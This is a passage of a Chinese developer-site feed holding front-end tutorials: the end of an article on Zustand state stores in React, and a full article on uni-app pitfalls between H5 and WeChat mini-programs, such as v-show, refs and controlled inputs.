<p>这种写法既保持了数据的纯净性，又让 React 能够精确地感知到状态变化，从而触发必要的重渲染。</p>
<h2 data-id="heading-9">四、 架构模式：模块化与持久化</h2>
<p>在大型应用中，我们不应该将所有状态塞进一个巨大的 Store。Zustand 鼓励创建多个独立的 Store，按功能切分。</p>
<h3 data-id="heading-10">1. 领域驱动的 Store 切分</h3>
<p>在提供的代码中，你可以清晰地看到三个文件分别管理三个领域：</p>
<ul>
<li><strong><code>counter.ts</code></strong>: 基础计数逻辑（工具类状态）。</li>
<li><strong><code>todo.ts</code></strong>: 业务数据逻辑（列表、增删改查）。</li>
<li><strong><code>user.ts</code></strong>: 全局会话逻辑（登录、注销、用户信息）。</li>
</ul>
<p>这种结构类似于后端的微服务或数据库表设计，互不干扰，清晰明了。</p>
<h3 data-id="heading-11">2. 用户认证状态管理 (<code>user.ts</code>)</h3>
<p>用户登录状态是典型的“全局共享”数据。一旦登录，Header 组件需要显示头像，设置页需要显示资料，购物车需要校验权限。</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-comment">// user.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useUserStore = create&lt;<span class="hljs-title class_">UserState</span>&gt;()(
    <span class="hljs-title function_">persist</span>(
        <span class="hljs-function">(<span class="hljs-params">set</span>) =&gt;</span> ({
            <span class="hljs-attr">isLogin</span>: <span class="hljs-literal">false</span>,
            <span class="hljs-attr">user</span>: <span class="hljs-literal">null</span>,
            <span class="hljs-attr">login</span>: <span class="hljs-function">(<span class="hljs-params">user</span>) =&gt;</span> <span class="hljs-title function_">set</span>({ <span class="hljs-attr">isLogin</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">user</span>: user }),
            <span class="hljs-attr">logout</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">set</span>({ <span class="hljs-attr">isLogin</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">user</span>: <span class="hljs-literal">null</span>}),
        }),
        { <span class="hljs-attr">name</span>: <span class="hljs-string">'user'</span> }
    )
)
</code></pre>
<p>结合 <code>persist</code> 中间件，这实现了一个极简的“记住我”功能。用户关闭浏览器再打开，只要 <code>localStorage</code> 中有数据，<code>isLogin</code> 依然为 <code>true</code>。</p>
<h2 data-id="heading-12">五、 实战：在 React 组件中消费状态</h2>
<p>有了“银行”，组件如何“取钱”？<code>App.tsx</code> 展示了极简的消费方式。</p>
<h3 data-id="heading-13">1. Hooks 方式调用</h3>
<p>你不需要 HOC（高阶组件），不需要 <code>connect</code>，不需要 <code>&lt;Provider&gt;</code>。</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-comment">// App.tsx</span>
<span class="hljs-keyword">import</span> { useCounterStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'./store/counter'</span>
<span class="hljs-keyword">import</span> { useTodoStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'./store/todo'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 就像使用 useState 一样自然</span>
  <span class="hljs-keyword">const</span> { count, increment, decrement, reset } = <span class="hljs-title function_">useCounterStore</span>();
  
  <span class="hljs-comment">// 获取 Todo 相关的状态和方法</span>
  <span class="hljs-keyword">const</span> { todos, addTodo, toggleTodo, removeTodo } = <span class="hljs-title function_">useTodoStore</span>();
  
  <span class="hljs-comment">// ...</span>
}
</code></pre>
<h3 data-id="heading-14">2. 性能优化：按需选取 (Selectors)</h3>
<p>虽然在 <code>App.tsx</code> 中我们直接解构了整个 Store 的返回值，但在生产环境中，<strong>最佳实践是只选取你需要的状态</strong>。这能避免不必要的重渲染。</p>
<p>例如，如果一个组件只需要显示 <code>count</code>，而不需要 <code>increment</code> 方法：</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-comment">// 推荐写法：只订阅 count 的变化</span>
<span class="hljs-keyword">const</span> count = <span class="hljs-title function_">useCounterStore</span>(<span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> state.<span class="hljs-property">count</span>);
</code></pre>
<p>如果 Store 中还有其他无关属性更新了，只要 <code>count</code> 没变，这个组件就不会重新渲染。这是 Zustand 高性能的关键所在。</p>
<h3 data-id="heading-15">3. UI 交互逻辑</h3>
<p><code>App.tsx</code> 展示了清晰的逻辑分层：</p>
<ol>
<li><strong>UI 层</strong>：<code>&lt;input&gt;</code>, <code>&lt;button&gt;</code>, List 渲染。</li>
<li><strong>本地状态层</strong>：<code>inputValue</code> (使用 <code>useState</code> 管理输入框的临时状态，因为这是 UI 细节，不需要放入全局 Store)。</li>
<li><strong>全局业务层</strong>：点击 Add 时，调用 <code>addTodo(inputValue)</code>。</li>
</ol>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-comment">// 典型的 UI 触发 Action 流程</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleAdd</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">if</span> (inputValue.<span class="hljs-title function_">trim</span>() === <span class="hljs-string">''</span>) <span class="hljs-keyword">return</span>;
    <span class="hljs-title function_">addTodo</span>(inputValue.<span class="hljs-title function_">trim</span>()); <span class="hljs-comment">// 调用全局 Store 的方法</span>
    <span class="hljs-title function_">setInputValue</span>(<span class="hljs-string">''</span>);          <span class="hljs-comment">// 重置本地 UI 状态</span>
}
</code></pre>
<h2 data-id="heading-16">六、 总结与展望</h2>
<p>Zustand 以其极简的 API 设计和强大的功能（中间件、TypeScript 支持、DevTools）成为了 React 状态管理的新宠。</p>
<p><strong>回顾我们学到的：</strong></p>
<ol>
<li><strong>创建 (Create)</strong> : 使用 <code>create</code> 定义 Store，将数据和操作封装在一起。</li>
<li><strong>持久化 (Persist)</strong> : 利用中间件轻松实现数据本地存储。</li>
<li><strong>消费 (Use)</strong> : 在组件中通过 Hooks 轻松获取状态和方法。</li>
<li><strong>架构 (Structure)</strong> : 按领域拆分 Store，保持代码整洁。</li>
</ol>
<p>如果你的项目觉得 Context API 难以维护，又觉得 Redux 过于繁琐，那么 Zustand 无疑是最佳的中间路线。它真正做到了像“中央银行”一样，安全、高效、井井有条地管理着应用的数据资产。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[uni-app开发，为什么 H5 正常、微信小程序频繁踩坑？]]></title>    <link>https://juejin.cn/post/7602154088477130790</link>    <guid>https://juejin.cn/post/7602154088477130790</guid>    <pubDate>2026-02-03T04:32:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602154088477130790" data-draft-id="7602252722373050419" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="uni-app开发，为什么 H5 正常、微信小程序频繁踩坑？"/> <meta itemprop="keywords" content="微信小程序"/> <meta itemprop="datePublished" content="2026-02-03T04:32:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="念你那丝微笑"/> <meta itemprop="url" content="https://juejin.cn/user/3237378908756792"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            uni-app开发，为什么 H5 正常、微信小程序频繁踩坑？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3237378908756792/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    念你那丝微笑
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T04:32:14.000Z" title="Tue Feb 03 2026 04:32:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>最近用 uni-app 写了一个项目，本地用 H5 模式开发和调试时一切正常，页面、交互、数据更新都没有问题。
但当代码部署到 微信小程序 后，却陆续出现了一些诡异的问题：
有的逻辑在 H5 能跑，小程序却完全不生效；有的组件在 H5 表现正常，小程序却怎么调都不对。</p>
<p>一开始我以为是自己代码写得有问题，直到踩坑越来越多才发现——
H5 和微信小程序的差异，远比我最初想象的要大得多。</p>
<p>所以想写篇博客记录一下开发中遇到的坑以及是如何解决的</p>
<blockquote>
<p><strong>同一套 uni-app / Vue 代码，H5 跑得好好的，到了微信小程序却各种翻车。</strong></p>
<p>v-show 不生效、table 里 ref 调不到、输入框值怎么都回不去……</p>
<p>这些问题并不是偶发 bug，而是<strong>微信小程序底层架构与浏览器完全不同</strong>导致的必然结果。</p>
</blockquote>
<p>本文从实际场景出发，把我在实际开发中高频踩到的坑系统整理一遍，树立一下<strong>小程序思维</strong>。</p>
<hr/>
<h2 data-id="heading-1">一、核心结论先行</h2>
<p>一句话总结微信小程序的本质：</p>
<blockquote>
<p><strong>微信小程序 = 双线程 + setData + 自定义组件</strong></p>
</blockquote>
<p>而 H5 是：</p>
<blockquote>
<p><strong>浏览器 + DOM + 同步更新</strong></p>
</blockquote>
<p>你在开发中遇到的 80% 问题，都可以回到这条差异上来解释。</p>
<hr/>
<h2 data-id="heading-2">二、什么是「双线程模型」？</h2>
<h3 data-id="heading-3">1. H5（浏览器）的运行方式</h3>
<p>在浏览器中：</p>
<ul>
<li>JS 可以直接操作 DOM</li>
<li>数据变化 → 视图几乎同步更新</li>
<li><code>v-model</code>、<code>input.value</code> 都是“最终裁判”</li>
</ul>
<p>可以理解为：</p>
<pre><code class="hljs">JS 线程
  ↓
DOM
  ↓
页面立刻变化
</code></pre>
<p>这是一个<strong>单一运行环境</strong>。</p>
<hr/>
<h3 data-id="heading-4">2. 微信小程序的运行方式</h3>
<p>微信小程序为了安全性和可控性，<strong>彻底禁用了 DOM</strong>，改成了双线程架构：</p>
<pre><code class="hljs language-scss" lang="scss">┌──────────────┐
│  逻辑层 JS   │  ← 你的 Vue / JS 代码
└───────▲──────┘
        │ <span class="hljs-built_in">setData</span>(JSON)
┌───────▼──────┐
│  视图层 WXML │  ← 渲染、组件内部状态
└──────────────┘
</code></pre>
<p>特点：</p>
<ul>
<li>逻辑层和视图层<strong>完全隔离</strong></li>
<li>只能通过 <code>setData</code> 传 JSON 数据</li>
<li>所有 UI 更新都是<strong>异步的</strong></li>
</ul>
<p><strong>JS 不能直接改 UI，只能“请求”视图层更新。</strong></p>
<hr/>
<h2 data-id="heading-5">三、为什么「H5 能跑，小程序翻车」？</h2>
<p>下面这些你踩过的坑，其实都源于同一个原因。</p>
<hr/>
<h2 data-id="heading-6">四、v-show 在 th / td 不生效</h2>
<h3 data-id="heading-7">1. H5 中的认知</h3>
<pre><code class="hljs language-vue" lang="vue">&lt;td v-show="show"&gt;库存&lt;/td&gt;
</code></pre>
<p>在浏览器里：</p>
<ul>
<li>本质是 <code>display: none</code></li>
<li>DOM 仍然存在</li>
<li>table 布局可以正确处理</li>
</ul>
<hr/>
<h3 data-id="heading-8">2. 小程序中为什么不行？</h3>
<p>原因有两个：</p>
<ol>
<li>
<p><strong>小程序没有真实的 table DOM</strong></p>
<ul>
<li><code>table / tr / td</code> 只是被编译成普通 view</li>
<li>表格布局是 uni-ui 模拟的</li>
</ul>
</li>
<li>
<p><strong>表格结构在视图层一次性计算</strong></p>
<ul>
<li><code>v-show</code> 只改逻辑层状态</li>
<li>列宽、行结构不会重新计算</li>
</ul>
</li>
</ol>
<p>结果就是：</p>
<blockquote>
<p>数据变了，但表格结构不重算</p>
</blockquote>
<h3 data-id="heading-9">✅ 正确做法</h3>
<pre><code class="hljs language-vue" lang="vue">&lt;th v-if="showCol"&gt;库存&lt;/th&gt;
&lt;td v-if="showCol"&gt;{{ row.stock }}&lt;/td&gt;
</code></pre>
<p><strong>在 table 结构里：只用 <code>v-if</code>，不要用 <code>v-show</code>。</strong></p>
<hr/>
<h2 data-id="heading-10">五、table 点击事件里调用 ref 不生效</h2>
<h3 data-id="heading-11">1. 常见写法</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">openPopup</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">$refs</span>.<span class="hljs-property">popupRef</span>.<span class="hljs-title function_">open</span>()
}
</code></pre>
<p>H5：大多能跑</p>
<p>小程序：经常无效</p>
<hr/>
<h3 data-id="heading-12">2. 真正原因</h3>
<p>在小程序中，事件链路是：</p>
<pre><code class="hljs language-markdown" lang="markdown">点击 td（视图层）
↓
事件传到逻辑层
↓
你同步调用 ref
↓
popup 组件：
<span class="hljs-bullet">  -</span> 可能还没渲染
<span class="hljs-bullet">  -</span> 可能被 v-show 隐藏
</code></pre>
<p><strong>ref 在小程序中是异步可用的。</strong></p>
<hr/>
<h3 data-id="heading-13">✅ 正确用法</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">openPopup</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">this</span>.$nextTick(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">$refs</span>.<span class="hljs-property">popupRef</span>?.<span class="hljs-title function_">open</span>()
  })
}
</code></pre>
<p>并且：</p>
<ul>
<li>popup 尽量用 <code>v-if</code></li>
<li>不要指望 ref 在同一个 tick 里可用</li>
</ul>
<h2 data-id="heading-14">其实 <code>$refs + $nextTick</code> 在微信小程序依然不生效的真实原因</h2>
<p>很多人在 H5 中已经形成了一个<strong>条件反射式写法</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">openPopup</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">this</span>.$nextTick(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">$refs</span>.<span class="hljs-property">popupRef</span>?.<span class="hljs-title function_">open</span>()
  })
}
</code></pre>
<p>在 <strong>H5 / WebView</strong> 下，这种写法基本 100% 生效；
但在 <strong>微信小程序（包括 uni-app）中，这段代码依然可能完全不生效</strong>。</p>
<h2 data-id="heading-15">❌ 为什么有时候 <code>$nextTick + ref</code> 在小程序里也不可靠？</h2>
<p>核心原因只有一句话：</p>
<blockquote>
<p><strong><code>$nextTick</code> 只能保证 Vue 虚拟 DOM 更新完成，不能保证小程序组件实例已经 ready</strong>。</p>
</blockquote>
<p>在微信小程序中：</p>
<ul>
<li>组件是 <strong>自定义组件</strong>（不是 DOM）</li>
<li>渲染发生在 <strong>渲染层线程</strong></li>
<li>父组件逻辑运行在 <strong>逻辑层线程</strong></li>
<li>组件实例的创建、挂载、通信，都需要经过 <code>setData</code> 的异步桥接</li>
</ul>
<p>因此会出现以下真实现象：</p>





















<table><thead><tr><th>你以为</th><th>实际发生</th></tr></thead><tbody><tr><td><code>$nextTick</code> 后 ref 一定存在</td><td>ref 变量存在，但组件实例尚未 ready</td></tr><tr><td><code>this.$refs.popupRef.open()</code></td><td>调用时组件方法尚未注入</td></tr><tr><td>控制台不报错</td><td>UI 没任何反应</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-16">✅ 小程序中最稳定、推荐的做法：状态驱动 + emit 回传</h3>
<p><strong>不要用父组件主动“命令式”调用子组件方法</strong>，而是：</p>
<blockquote>
<p>👉 <strong>用状态控制子组件，用事件通知父组件</strong></p>
</blockquote>
<h4 data-id="heading-17">父组件</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;Popup
  :visible="popupVisible"
  @close="popupVisible = false"
/&gt;
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">data</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> { <span class="hljs-attr">popupVisible</span>: <span class="hljs-literal">false</span> }
},
<span class="hljs-attr">methods</span>: {
  <span class="hljs-title function_">openPopup</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">popupVisible</span> = <span class="hljs-literal">true</span>
  }
}
</code></pre>
<h4 data-id="heading-18">子组件</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-attr">props</span>: { <span class="hljs-attr">visible</span>: <span class="hljs-title class_">Boolean</span> },
<span class="hljs-attr">watch</span>: {
  <span class="hljs-title function_">visible</span>(<span class="hljs-params">val</span>) {
    val ? <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">open</span>() : <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">close</span>()
  }
},
<span class="hljs-attr">methods</span>: {
  <span class="hljs-title function_">close</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.$emit(<span class="hljs-string">'close'</span>)
  }
}
</code></pre>
<h4 data-id="heading-19">🧠 一句话总结</h4>
<ul>
<li>H5：<strong>可以命令式（ref / 调方法）</strong></li>
<li>小程序：<strong>必须声明式（状态驱动）</strong>
v-show 在 th / td 不生效</li>
</ul>
<h2 data-id="heading-20">六、输入框值更新失败（uni-easyinput）</h2>
<h3 data-id="heading-21">1. 现象</h3>
<ul>
<li>H5：校验后值能回退</li>
<li>小程序：输入框仍显示非法值</li>
</ul>
<hr/>
<h3 data-id="heading-22">2. 根因</h3>
<p>在小程序中：</p>
<pre><code class="hljs">组件内部 value（视图层）
≠
v-model 绑定值（逻辑层）
</code></pre>
<p>如果组件不是“完全受控”：</p>
<ul>
<li>视图层内部状态优先</li>
<li>你 setData 只是建议</li>
</ul>
<hr/>
<h3 data-id="heading-23">✅ 正确组合</h3>
<pre><code class="hljs language-vue" lang="vue">&lt;uni-easyinput
  v-model="row.qty"
  :controlled="true"
  @change="checkQty"
/&gt;
</code></pre>
<p>关键点：</p>
<ul>
<li>使用 <code>change</code> 而不是 <code>input</code></li>
<li>开启 <code>controlled</code></li>
</ul>
<hr/>
<h2 data-id="heading-24">七、input / change / blur 的正确选择</h2>

























<table><thead><tr><th>事件</th><th>建议</th><th>原因</th></tr></thead><tbody><tr><td>input</td><td>❌ 少用</td><td>频繁、不可控</td></tr><tr><td>change</td><td>✅ 推荐</td><td>停止输入后的业务节点</td></tr><tr><td>blur</td><td>⚠️ UI 用</td><td>只是焦点变化</td></tr></tbody></table>
<p><strong>业务校验一律优先用 <code>change</code>。</strong></p>
<hr/>
<h2 data-id="heading-25">八、ref、v-for、响应式的隐藏雷区</h2>
<h3 data-id="heading-26">1. ref + v-for</h3>
<ul>
<li>H5：ref 数组</li>
<li>小程序：可能只有最后一个</li>
</ul>
<p>👉 不要依赖 ref 操作列表项</p>
<hr/>
<h3 data-id="heading-27">2. 深层对象更新</h3>
<pre><code class="hljs language-js" lang="js">list[index].<span class="hljs-property">count</span> = <span class="hljs-number">1</span>
</code></pre>
<p>在小程序中不稳定，推荐：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">this</span>.<span class="hljs-property">list</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">list</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span>
  item.<span class="hljs-property">id</span> === row.<span class="hljs-property">id</span> ? { ...item, <span class="hljs-attr">count</span>: <span class="hljs-number">1</span> } : item
)
<span class="hljs-comment">//或者</span>
<span class="hljs-keyword">const</span> index=<span class="hljs-variable language_">this</span>.<span class="hljs-property">list</span>.<span class="hljs-title function_">find</span>(item.<span class="hljs-property">id</span>===row.<span class="hljs-property">id</span>)
<span class="hljs-variable language_">this</span>.$set(<span class="hljs-variable language_">this</span>.<span class="hljs-property">list</span>[index], <span class="hljs-string">'count'</span>, <span class="hljs-number">1</span>)
</code></pre>
<p><strong>不可变更新在小程序更安全。</strong></p>
<hr/>
<h2 data-id="heading-28">九、统一解释模型（记住这个）</h2>
<p>你遇到的所有问题，其实都是：</p>
<blockquote>
<p><strong>逻辑层变了，但视图层没有按你预期同步</strong></p>
</blockquote>
<p>对应关系：</p>





















<table><thead><tr><th>现象</th><th>根因</th></tr></thead><tbody><tr><td>v-show 不生效</td><td>视图结构不重算</td></tr><tr><td>ref 调不到</td><td>组件未 ready</td></tr><tr><td>input 回写失败</td><td>内部状态优先</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-29">十、小程序开发「安全原则」</h2>
<ol>
<li>少用 <code>input</code>，多用 <code>change</code></li>
<li>表格、弹窗优先 <code>v-if</code></li>
<li>ref 一律 <code>nextTick</code></li>
<li>组件要么全受控，要么不受控</li>
<li>减少 setData 次数</li>
</ol>
<hr/>
<h2 data-id="heading-30">十一、一句话总结</h2>
<blockquote>
<p><strong>H5 是“我命令页面怎么变”</strong>
<strong>小程序是“我请求页面帮我变”</strong></p>
</blockquote>
<p>当你真正接受这一点，80% 的坑都会自动消失。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[彻底告别 iOS 13+ 输入框“时隐时现” —— 深度解析嵌套布局与键盘库冲突]]></title>    <link>https://juejin.cn/post/7602176198874546219</link>    <guid>https://juejin.cn/post/7602176198874546219</guid>    <pubDate>2026-02-03T04:26:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602176198874546219" data-draft-id="7602177588442906643" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="彻底告别 iOS 13+ 输入框“时隐时现” —— 深度解析嵌套布局与键盘库冲突"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-02-03T04:26:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="StarkCoder"/> <meta itemprop="url" content="https://juejin.cn/user/207173399875662"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            彻底告别 iOS 13+ 输入框“时隐时现” —— 深度解析嵌套布局与键盘库冲突
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/207173399875662/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    StarkCoder
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T04:26:00.000Z" title="Tue Feb 03 2026 04:26:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
